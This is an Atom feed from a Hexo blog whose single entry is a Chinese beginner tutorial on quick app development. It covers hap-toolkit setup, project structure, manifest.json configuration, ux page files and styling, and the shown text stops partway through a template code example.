<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Poetry&#39;s Blog</title>
  
  <subtitle>Choose a gesture to allow yourself to live irreplaceable.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.poetries.top/"/>
  <updated>2018-08-23T01:41:37.487Z</updated>
  <id>http://blog.poetries.top/</id>
  
  <author>
    <name>Poetry</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>快应用入门小结篇</title>
    <link href="http://blog.poetries.top/2018/08/21/quick-app-summary/"/>
    <id>http://blog.poetries.top/2018/08/21/quick-app-summary/</id>
    <published>2018-08-21T10:05:43.000Z</published>
    <updated>2018-08-23T01:41:37.487Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>MD原文件 <a href="https://github.com/poetries/poetries.github.io/blob/dev/source/_posts/quick-app-summary.md" target="_blank" rel="noopener">https://github.com/poetries/poetries.github.io/blob/dev/source/_posts/quick-app-summary.md</a></p></blockquote><blockquote><p>注册账号通过 <a href="https://www.quickapp.cn/docCenter/post/74" target="_blank" rel="noopener">https://www.quickapp.cn/docCenter/post/74</a></p></blockquote><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><h2 id="1-1-安装NodeJS"><a href="#1-1-安装NodeJS" class="headerlink" title="1.1 安装NodeJS"></a>1.1 安装NodeJS</h2><blockquote><p>需安装<code>6.0</code>以上版本的<code>NodeJS</code></p></blockquote><h2 id="1-2-安装hap-toolkit"><a href="#1-2-安装hap-toolkit" class="headerlink" title="1.2 安装hap-toolkit"></a>1.2 安装hap-toolkit</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// hap -V // 会显示安装版本信息</span><br><span class="line">npm install -g hap-toolkit</span><br></pre></td></tr></table></figure><h2 id="1-3-创建项目工程"><a href="#1-3-创建项目工程" class="headerlink" title="1.3 创建项目工程"></a>1.3 创建项目工程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hap init projectName</span><br><span class="line"></span><br><span class="line">// 增加编译支持</span><br><span class="line">hap update --force</span><br><span class="line"></span><br><span class="line">cd projectName &amp;&amp; npm i</span><br></pre></td></tr></table></figure><p>生成的目录结构</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">├── sign rpk <span class="comment">//包签名模块</span></span><br><span class="line">│ └── debug <span class="comment">//调试环境</span></span><br><span class="line">│ ├── certificate.pem <span class="comment">//证书文件</span></span><br><span class="line">│ └── private.pem <span class="comment">//私钥文件</span></span><br><span class="line">├── src</span><br><span class="line">│ ├── Common <span class="comment">//公用的资源和组件文件</span></span><br><span class="line">│ │ └── logo.png <span class="comment">//应用图标</span></span><br><span class="line">│ ├── Demo <span class="comment">//页面目录</span></span><br><span class="line">│ | └── index.ux <span class="comment">//页面文件，可自定义页面名称</span></span><br><span class="line">│ ├── app.ux <span class="comment">//APP文件，可引入公共脚本，暴露公共数据和方法等</span></span><br><span class="line">│ └── manifest.json <span class="comment">//项目配置文件，配置应用图标、页面路由等</span></span><br><span class="line">└── package.json <span class="comment">//定义项目需要的各种模块及配置信息</span></span><br></pre></td></tr></table></figure><ul><li><code>src</code>：项目源文件夹</li><li><code>sign</code>：签名模块，当前仅有<code>debug</code>签名，如果内测上线，请添加<code>release</code>文件夹，增加线上签名；签名生成方法详见文档编译工具</li></ul><p><strong>编译项目</strong></p><ul><li><code>npm run release</code>     # 发布程序包，在 <code>/dist/.signed.rpk</code>，注意需要使用 <code>release</code> 签名模块</li><li><code>npm run build</code>      # 生成 <code>build</code> 和 <code>dist</code> 两个目录。前者是临时产出，后者是最终产出</li><li><code>npm run watch</code>      # 文件保存时自动编译和调试</li></ul><p>手动编译项目</p><blockquote><p>在项目的根目录下，运行如下命令进行编译打包，生成rpk包</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure><ul><li>编译打包成功后，项目根目录下会生成文件夹：<code>build</code>、<code>dist</code></li><li><code>build</code>：临时产出，包含编译后的页面js，图片等</li><li><code>dist</code>：最终产出，包含<code>rpk</code>文件。其实是将<code>build</code>目录下的资源打包压缩为一个文件，后缀名为<code>rpk</code>，这个<code>rpk</code>文件就是项目编译后的最终产出</li></ul><p>自动编译项目</p><ul><li>每次修改源代码文件后，都自动编译项目</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run watch</span><br></pre></td></tr></table></figure><p><strong>在安卓手机上安装调试工具</strong></p><blockquote><p><a href="https://www.quickapp.cn/docCenter/post/69" target="_blank" rel="noopener">https://www.quickapp.cn/docCenter/post/69</a></p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1480597-5b4e639317894e37.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="1-4-连接手机进行调试"><a href="#1-4-连接手机进行调试" class="headerlink" title="1.4 连接手机进行调试"></a>1.4 连接手机进行调试</h2><blockquote><p>注意：一定要注意手机连接的wifi与电脑所连接的网络需要在同一局域网和网段，需要能够相互访问。</p></blockquote><ul><li>在项目根目录下执行如下命令，启动HTTP调试服务器：（<code>server</code>前需要先<code>npm run build</code>）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run server</span><br></pre></td></tr></table></figure><ul><li>开发者可以通过命令行终端或者调试服务器主页看到提供扫描的二维码</li><li>开发者通过快应用调试器扫码安装按钮，扫码安装待调试的<code>rpk</code>文件</li><li>开发者点击快应用调试器中的开始调试按钮，开始调试</li></ul><blockquote><p>打开之前安装的快应用调试助手扫描即可预览</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1480597-32579fff42fb9530.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>扫描二维码之后点击开始调试，会调出devtool工具本地调试</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1480597-3cd020c83fd15543.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/1480597-afd1d41337c7a3a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="1-5-安装Hap-Extension"><a href="#1-5-安装Hap-Extension" class="headerlink" title="1.5 安装Hap Extension"></a>1.5 安装Hap Extension</h2><blockquote><p>启动Visual Studio Code，打开项目，点击左上侧扩展，搜索hap，点击安装Hap Extension</p></blockquote><ul><li>更多详情 <a href="https://doc.quickapp.cn/tutorial/getting-started/code-edit-conf.html" target="_blank" rel="noopener">https://doc.quickapp.cn/tutorial/getting-started/code-edit-conf.html</a></li></ul><h1 id="二、快应用结构分析"><a href="#二、快应用结构分析" class="headerlink" title="二、快应用结构分析"></a>二、快应用结构分析</h1><h2 id="2-1-文件组织"><a href="#2-1-文件组织" class="headerlink" title="2.1 文件组织"></a>2.1 文件组织</h2><blockquote><p>一个应用包含：描述项目配置信息的<code>manifest</code>文件，放置项目公共资源脚本的<code>app.ux</code>文件，多个描述页面/自定义组件的ux文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">├── manifest.json</span><br><span class="line">├── app.ux</span><br><span class="line">├── Page1</span><br><span class="line">│   ├── page1.ux</span><br><span class="line">├── Page2</span><br><span class="line">│   ├── page2.ux</span><br><span class="line">└── Common</span><br><span class="line">    ├── ComponentA.ux</span><br><span class="line">    ├── ComponentB.ux</span><br><span class="line">    └── xxx.png</span><br></pre></td></tr></table></figure><blockquote><p>其中<code>Common</code>目录下为公用的资源文件和组件文件，每个页面目录下存放各自页面私有的资源文件和组件文件，如：图片，<code>CSS</code>，<code>JS</code>等</p></blockquote><h2 id="2-2-源码文件"><a href="#2-2-源码文件" class="headerlink" title="2.2 源码文件"></a>2.2 源码文件</h2><blockquote><p><code>APP</code>，页面和自定义组件均通过<code>ux</code>文件编写，<code>ux</code>文件由<code>template</code>模板、<code>style</code>样式和<code>script</code>脚本3个部分组成，一个典型的页面<code>ux</code>文件示例如下</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- template里只能有一个根节点 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"demo-page"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>欢迎打开&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 点击跳转详情页 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"btn"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"跳转到详情页"</span> <span class="attr">onclick</span>=<span class="string">"routeDetail"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.demo-page</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex-direction: column;</span></span><br><span class="line"><span class="undefined">    justify-content: center;</span></span><br><span class="line"><span class="undefined">    align-items: center;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.title</span> &#123;</span></span><br><span class="line"><span class="undefined">    font-size: 40px;</span></span><br><span class="line"><span class="undefined">    text-align: center;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">  <span class="selector-class">.btn</span> &#123;</span></span><br><span class="line"><span class="undefined">    width: 550px;</span></span><br><span class="line"><span class="undefined">    height: 86px;</span></span><br><span class="line"><span class="undefined">    margin-top: 75px;</span></span><br><span class="line"><span class="undefined">    border-radius: 43px;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">background-color</span>: <span class="selector-id">#09ba07</span>;</span></span><br><span class="line"><span class="undefined">    font-size: 30px;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">color</span>: <span class="selector-id">#ffffff</span>;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">'@system.router'</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 页面级组件的数据模型，影响传入数据的覆盖机制：private内定义的属性不允许被覆盖</span></span></span><br><span class="line"><span class="undefined">    private: &#123;</span></span><br><span class="line"><span class="javascript">      title: <span class="string">'示例页面'</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    routeDetail () &#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 跳转到应用内的某个页面，router用法详见：文档-&gt;接口-&gt;页面路由</span></span></span><br><span class="line"><span class="undefined">      router.push (&#123;</span></span><br><span class="line"><span class="javascript">        uri: <span class="string">'/DemoDetail'</span></span></span><br><span class="line"><span class="undefined">      &#125;)</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-3-manifest配置"><a href="#2-3-manifest配置" class="headerlink" title="2.3 manifest配置"></a>2.3 manifest配置</h2><blockquote><p><a href="https://doc.quickapp.cn/framework/manifest.html" target="_blank" rel="noopener">https://doc.quickapp.cn/framework/manifest.html</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    # 包名，区分不同应用的唯一id，因为名称其实是可以一样的</span><br><span class="line">    <span class="string">"package"</span>: <span class="string">"com.application.demo"</span>,</span><br><span class="line"></span><br><span class="line">    # 应用名称</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"hi"</span>,</span><br><span class="line"></span><br><span class="line">    # 版本管理的话，每次更新将versionCode自增1即可</span><br><span class="line">    <span class="string">"versionName"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">    <span class="string">"versionCode"</span>: <span class="string">"1"</span>,</span><br><span class="line">    <span class="string">"minPlatformVersion"</span>: <span class="string">"101"</span>,</span><br><span class="line"></span><br><span class="line">    # 程序的入口icon，所有关于文件的引用统一使用根目录</span><br><span class="line">    # 根目录对应src文件夹</span><br><span class="line">    <span class="string">"icon"</span>: <span class="string">"/Common/logo.png"</span>,</span><br><span class="line"></span><br><span class="line">    # </span><br><span class="line">    <span class="string">"features"</span>: [</span><br><span class="line">        &#123; <span class="string">"name"</span>: <span class="string">"system.prompt"</span> &#125;,</span><br><span class="line">        &#123; <span class="string">"name"</span>: <span class="string">"system.router"</span> &#125;,</span><br><span class="line">        &#123; <span class="string">"name"</span>: <span class="string">"system.shortcut"</span> &#125;</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="string">"permissions"</span>: [</span><br><span class="line">        &#123; <span class="string">"origin"</span>: <span class="string">"*"</span> &#125;</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    # 配置相关</span><br><span class="line">    <span class="string">"config"</span>: &#123;</span><br><span class="line">        # 这里的设置是log输出的最低等级</span><br><span class="line">        # 如果是warn的话，info类型将不会输出</span><br><span class="line">        # 等级请参考js中的console日志</span><br><span class="line">        <span class="string">"logLevel"</span>: <span class="string">"off"</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    # 路由</span><br><span class="line">    # 这里会配置应用入口的页面</span><br><span class="line">    # 所有的页面都需要在这里配置</span><br><span class="line">    # 会把页面与对应的页面文件对应起来</span><br><span class="line">    # 经过配置之后可以通过/Demo访问到Demo目录下的index.ux页面</span><br><span class="line">    <span class="string">"router"</span>: &#123;</span><br><span class="line">        <span class="string">"entry"</span>: <span class="string">"Demo"</span>,</span><br><span class="line">        <span class="string">"pages"</span>: &#123;</span><br><span class="line">            <span class="string">"Demo"</span>: &#123;</span><br><span class="line">                # 这里对应的Demo文件夹里的index.ux</span><br><span class="line">                <span class="string">"component"</span>: <span class="string">"index"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"DemoDetail"</span>: &#123;</span><br><span class="line">                <span class="string">"component"</span>: <span class="string">"index"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"About"</span>: &#123;</span><br><span class="line">                <span class="string">"component"</span>: <span class="string">"index"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    # 配置页面UI显示</span><br><span class="line">    # 主要分为两种，页面公有与页面私有</span><br><span class="line">    <span class="string">"display"</span>: &#123;</span><br><span class="line">        # 这三个都是所有页面公有的，顶部titleBar内容</span><br><span class="line">        <span class="string">"titleBarText"</span>: <span class="string">"public title"</span></span><br><span class="line">        <span class="string">"titleBarBackgroundColor"</span>: <span class="string">"#f2f2f2"</span>,</span><br><span class="line">        <span class="string">"titleBarTextColor"</span>: <span class="string">"#414141"</span>,</span><br><span class="line"></span><br><span class="line">        # 会增加一个导航栏</span><br><span class="line">        <span class="string">"menu"</span>: <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">        # 页面私有内容</span><br><span class="line">        <span class="string">"pages"</span>: &#123;</span><br><span class="line">            <span class="string">"Demo"</span>: &#123;</span><br><span class="line">                # 这里面的内容就是每个页面私有的了</span><br><span class="line">                <span class="string">"titleBarText"</span>: <span class="string">"示例页"</span>,</span><br><span class="line">                <span class="string">"menu"</span>: <span class="literal">false</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"DemoDetail"</span>: &#123;</span><br><span class="line">                <span class="string">"titleBarText"</span>: <span class="string">"详情页"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"About"</span>: &#123;</span><br><span class="line">                <span class="string">"menu"</span>: <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>package</code> 应用包名，确认与原生应用的包名不一致，推荐采用<code>com.company.module</code>的格式，如：<code>com.example.demo</code></li><li><code>name</code> 应用名称，6个汉字以内，与应用商店保存的名称一致，用于在桌面图标、弹窗等处显示应用名称</li><li><code>icon</code> 应用图标，提供<code>192x192</code>大小的即可</li><li><code>versionName</code> 应用版本名称，如：<code>&quot;1.0&quot;</code></li><li><code>versionCode</code> 应用版本号，从1自增，推荐每次重新上传包时<code>versionCode+1</code></li><li><code>minPlatformVersion</code> 支持的最小平台版本号，兼容性检查，避免上线后在低版本平台运行并导致不兼容；如果不填按照内测版本处理</li><li><code>features</code> 接口列表，绝大部分接口都需要在这里声明，否则不能调用，详见每个接口的文档说明</li><li><code>config</code> 系统配置<ul><li><code>logLevel</code>：打印日志等级，分为<code>off</code>,<code>error</code>,<code>warn</code>,<code>info</code>,<code>log</code>,<code>debug</code></li><li><code>designWidth</code>：页面设计基准宽度，根据实际设备宽度来缩放元素大小</li></ul></li><li><code>router</code> 路由信息 <ul><li><code>entry:</code>首页名称</li><li><code>pages</code>:页面配置列表，<code>key</code>值为页面名称（对应页面目录名，例如Hello对应’Hello’目录），<code>value</code>为页面详细配置<code>page</code>，详见下面说明</li><li><code>router.page</code> 用于定义单个页面路由信息<ul><li><code>component</code>: 页面对应的组件名，与<code>ux</code>文件名保持一致，例如<code>&#39;hello&#39;</code> 对应 <code>&#39;hello.ux&#39;</code></li><li><code>path</code> 页面路径，例如<code>“/user”</code>,不填则默认为/&lt;页面名称&gt;。<code>path</code>必须唯一,不能和其他<code>page</code>的<code>path</code>相同。下面<code>page</code>的<code>path</code>因为缺失,会被设置为<code>“/Index”</code>：<code>&quot;Index&quot;</code>: <code>{&quot;component&quot;: &quot;index&quot;}</code></li><li><code>filter</code>: 声明页面可以处理某种请求</li></ul></li></ul></li><li><code>display UI</code>显示相关配置<ul><li><code>backgroundColor</code> 窗口背景颜色</li><li><code>fullScreen</code> 是否是全屏模式，默认不会同时作用于<code>titleBar</code>，<code>titleBar</code>需要继续通过<code>titleBar</code>控制</li><li><code>titleBar</code> 是否显示<code>titleBar</code></li><li><code>titleBarBackgroundColor</code>标题栏背景色</li><li><code>titleBarTextColor</code> 标题栏文字颜色</li><li><code>titleBarText</code> 标题栏文字(也可通过页面跳转传递参数(<code>titleBarText</code>)设置)</li><li><code>menu</code> 是否显示标题栏右上角菜单按钮</li><li><code>pages</code> 各个页面的显示样式，key为页面名（与路由中的页面名保持一致），<code>value</code>为窗口显示</li></ul></li></ul><h2 id="2-4-app-ux"><a href="#2-4-app-ux" class="headerlink" title="2.4 app.ux"></a>2.4 app.ux</h2><blockquote><p>当前<code>app.ux</code>编译后会包含<code>manifest</code>配置信息（可以在<code>npm run build</code>之后查看文件内容），所以请不要删除<code>/**manifest**/</code>的注释内容标识</p></blockquote><ul><li>您可以在<code>&lt;script&gt;</code>中引入一些公共的脚本，并暴露在当前app的对象上，如下所示，然后就可以在页面ux文件的<code>ViewModel</code>中，通过<code>this.$app.util</code>访问</li></ul><h2 id="2-5-style样式"><a href="#2-5-style样式" class="headerlink" title="2.5 style样式"></a>2.5 style样式</h2><ul><li>样式布局采用<code>CSS Flexbox</code>（弹性盒）样式</li></ul><blockquote><p>支持2种导入外部文件的方式</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 导入外部文件, 代替style内部样式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">src</span>=<span class="string">"./style.css"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 合并外部文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  @<span class="keyword">import</span> <span class="string">'./style.css'</span>;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.a</span> &#123;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>模板内部样式</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 内联inline --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:red; margin: 10px;"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- class声明 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"normal append"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p><strong>样式预编译</strong></p><blockquote><p>目前支持less, sass的预编译</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入外部文件, 代替style内部样式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"less"</span> <span class="attr">src</span>=<span class="string">"./lessFile.less"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--合并外部文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">"less"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">  @<span class="keyword">import</span> <span class="string">'./lessFile.less'</span>;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.page-less</span> &#123;</span></span><br><span class="line"><span class="css">    <span class="selector-id">#testTag</span> &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-class">.less-font-text</span>, <span class="selector-class">.less-font-comma</span> &#123;</span></span><br><span class="line"><span class="undefined">        font-size: 60px;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  /**</span></span><br><span class="line"><span class="undefined">   * 应用级别的配置，供所有页面公用</span></span><br><span class="line"><span class="undefined">   */</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> util <span class="keyword">from</span> <span class="string">'./util'</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="undefined">    showMenu: util.showMenu,</span></span><br><span class="line"><span class="undefined">    createShortcut: util.createShortcut</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-6-template模板"><a href="#2-6-template模板" class="headerlink" title="2.6 template模板"></a>2.6 template模板</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 